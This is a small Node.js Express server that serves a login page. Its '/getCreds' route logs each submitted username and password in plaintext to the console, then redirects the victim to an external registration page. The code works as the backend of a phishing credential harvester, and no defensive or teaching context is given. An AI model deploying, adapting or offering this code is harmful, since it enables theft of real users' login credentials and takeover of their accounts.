const express = require('express');
const path = require('path');
var bodyparser = require('body-parser')

const app = express();
const PORT = 80;

app.set('view engine', 'ejs');
app.use(bodyparser.urlencoded({ extended: true }));
app.use(bodyparser.json());

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Route for the main page
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.get('/login', (req, res) => {
    res.sendFile(__dirname + '/public/login.html');
});

app.post('/getCreds', (req, res) => {
    console.log("Username:", req.body.username);
    console.log("Password:", req.body.passwd);
    res.redirect("http://www.myblogapp.com/register");
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
